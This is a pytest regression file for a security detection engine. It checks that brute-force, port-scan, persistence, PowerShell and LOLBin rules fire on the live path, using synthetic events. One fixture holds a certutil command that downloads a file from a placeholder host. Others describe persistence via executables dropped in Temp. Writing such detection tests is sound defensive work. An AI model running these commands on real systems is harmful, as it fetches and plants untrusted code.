"""
Regression: the rule pack runs on the live path, over a lookback window (audit G-12).

Before: ``run_for_new_events`` built features from the events since the
device's last detection run only (often 1-5 events), and the V4 rules had no
caller, so a slow brute force split across runs never crossed a threshold and
port scan, persistence and LOLBin rules never ran. These tests drive the real
``run_for_new_events`` with the storage calls replaced by an in-memory device.
"""

from datetime import datetime, timedelta, timezone

import pytest

from lsadra.detection import detection_orchestrator as orch_mod
from lsadra.detection.detection_orchestrator import DetectionOrchestrator

T0 = datetime(2026, 1, 15, 2, 0, 0, tzinfo=timezone.utc)
ATTACKER = "198.51.100.37"


class _Layer:
    def __init__(self, out):
        self.out = out

    def score(self, df):
        return self.out(df)


class _Store:
    """An in-memory stand-in for the storage functions the orchestrator calls."""

    def __init__(self):
        self.events = []
        self.watermark = 0
        self.anomalies = []

    def add(self, minutes, event_type="auth_failure", ip=ATTACKER, **attributes):
        self.events.append({
            "id": len(self.events) + 1,
            "timestamp": (T0 + timedelta(minutes=minutes)).isoformat(),
            "device_id": "dev-demo", "user_id": "user-demo", "host": "demo-host-01",
            "effective_username": "bob.demo", "source_ip": ip, "event_type": event_type,
            "raw_message": "synthetic", "attributes": attributes, "is_synthetic": False,
        })

    def since(self, device_id, after_id, limit=500):
        return [e for e in self.events if e["id"] > after_id][:limit]

    def before(self, device_id, before_id, since, limit=2000):
        rows = [e for e in self.events if e["id"] < before_id and e["timestamp"][:19] >= since]
        return rows[-limit:]

    def insert(self, res):
        self.anomalies.append(res)
        return len(self.anomalies)


@pytest.fixture
def store(monkeypatch):
    s = _Store()
    monkeypatch.setattr(orch_mod, "get_watermark", lambda d: s.watermark)
    monkeypatch.setattr(orch_mod, "set_watermark", lambda d, w: setattr(s, "watermark", w))
    monkeypatch.setattr(orch_mod, "get_events_since", s.since)
    monkeypatch.setattr(orch_mod, "get_events_before", s.before)
    monkeypatch.setattr(orch_mod, "increment_device_event_count", lambda d, n: 10_000)
    monkeypatch.setattr(orch_mod, "get_device", lambda d: {"status": "ONLINE"})
    monkeypatch.setattr(orch_mod, "insert_anomaly", s.insert)
    monkeypatch.setattr(orch_mod.alert_hub, "publish", lambda res: None)
    return s


@pytest.fixture
def orchestrator():
    """Layers 1-3 abstain, so every alert below comes from the rules."""
    o = DetectionOrchestrator.__new__(DetectionOrchestrator)
    o._trained = True
    o._last_run = {}
    o.baseline = _Layer(lambda df: [{"z_max": 0.0, "is_baseline_anomaly": False}] * len(df))
    o.ensemble = type("E", (), {"predict": staticmethod(lambda df: [
        {"is_anomaly": False, "anomaly_score": 0.0, "votes": 0, "total_models": 3}] * len(df))})()
    o.autoencoder = _Layer(lambda df: [
        {"reconstruction_error": 0.0, "is_ae_anomaly": False}] * len(df))
    o.profile_store = type("P", (), {"update": staticmethod(lambda *a: None)})()
    o.incident_manager = type("I", (), {"process_anomaly": staticmethod(lambda res: 1)})()
    return o


def _run(orchestrator, monkeypatch):
    monkeypatch.setattr(orch_mod, "DETECTION_THROTTLE_SECONDS", 0)
    orchestrator._last_run = {}
    orchestrator.run_for_new_events("dev-demo")


def test_slow_brute_force_across_runs_is_detected(store, orchestrator, monkeypatch):
    # Run 1: five failures two minutes apart. Never 5 in 5 minutes; 5 in 15.
    for m in (0, 2, 4, 6, 8):
        store.add(m)
    _run(orchestrator, monkeypatch)
    assert store.anomalies == []

    # Run 2: four more. Alone they are 4 failures; with the stored context the
    # 15-minute window holds 8, which is the brute-force threshold.
    for m in (10, 12, 14, 16):
        store.add(m)
    _run(orchestrator, monkeypatch)

    assert store.anomalies, "slow brute force split across runs was missed"
    hit = store.anomalies[-1]
    assert hit["rule_id"] == "lsadra-auth-brute-force"
    assert hit["mitre_technique"] == "T1110.001"
    assert hit["mitre_tactics"] == ["Credential Access"]
    assert hit["mitre_confidence"] > 0
    assert hit["severity_label"] in ("MEDIUM", "HIGH", "CRITICAL")
    # Context rows are never scored twice: only run-2 events can alert.
    assert {a["event_id"] for a in store.anomalies} <= {6, 7, 8, 9}


def test_without_context_the_same_run_stays_quiet(store, orchestrator, monkeypatch):
    """Control: the second batch alone (as before the fix) does not cross a threshold."""
    monkeypatch.setattr(orch_mod, "get_events_before", lambda *a, **k: [])
    for m in (0, 2, 4, 6, 8):
        store.add(m)
    _run(orchestrator, monkeypatch)
    for m in (10, 12, 14, 16):
        store.add(m)
    _run(orchestrator, monkeypatch)
    assert store.anomalies == []


@pytest.mark.parametrize("event_type,attributes,rule_id", [
    ("service_install", {"image_path": "C:\\Windows\\Temp\\demo_updater.exe --svc"},
     "lsadra-persist-service-install"),
    ("scheduled_task_create", {"task_command": "C:\\Windows\\Temp\\demo.exe"},
     "lsadra-persist-scheduled-task"),
    ("process_exec", {"process_name": "powershell.exe", "encoded_command_len": 40},
     "lsadra-proc-encoded-powershell"),
    ("process_exec", {"process_name": "certutil.exe", "parent_process": "cmd.exe",
                      "cmdline": "certutil.exe -urlcache -f http://203.0.113.5/a C:\\Users\\Public\\a"},
     "lsadra-proc-lolbin-proxy-execution"),
    ("cron_modified", {"cron_user": "bob.demo"}, "lsadra-persist-cron-modified"),
    ("log_cleared", {"event_id": "1102"}, "lsadra-impair-event-log-cleared"),
])
def test_v4_rules_run_on_the_live_path(store, orchestrator, monkeypatch,
                                       event_type, attributes, rule_id):
    store.add(0, event_type=event_type, ip=None, **attributes)
    _run(orchestrator, monkeypatch)
    assert [a["rule_id"] for a in store.anomalies] == [rule_id]


def test_port_scan_on_the_live_path(store, orchestrator, monkeypatch):
    for i in range(20):
        store.add(i * 0.1, event_type="firewall_deny", ip="203.0.113.7",
                  dest_ip="192.0.2.10", dest_port=1000 + i)
    _run(orchestrator, monkeypatch)
    assert "lsadra-net-port-scan" in {a["rule_id"] for a in store.anomalies}


def test_benign_events_raise_nothing(store, orchestrator, monkeypatch):
    store.add(0, event_type="auth_success", ip="192.0.2.31", auth_method="publickey")
    store.add(1, event_type="process_exec", ip="192.0.2.31", binary="/usr/bin/git")
    store.add(2, event_type="cron_job", ip=None, job_name="logrotate")
    store.add(3, event_type="sudo_exec", ip="192.0.2.31", command="/usr/bin/id")
    store.add(4, event_type="network_flow", ip="192.0.2.31", dest_ip="192.0.2.10",
              dest_port=443, bytes_out=20_000)
    _run(orchestrator, monkeypatch)
    assert store.anomalies == []
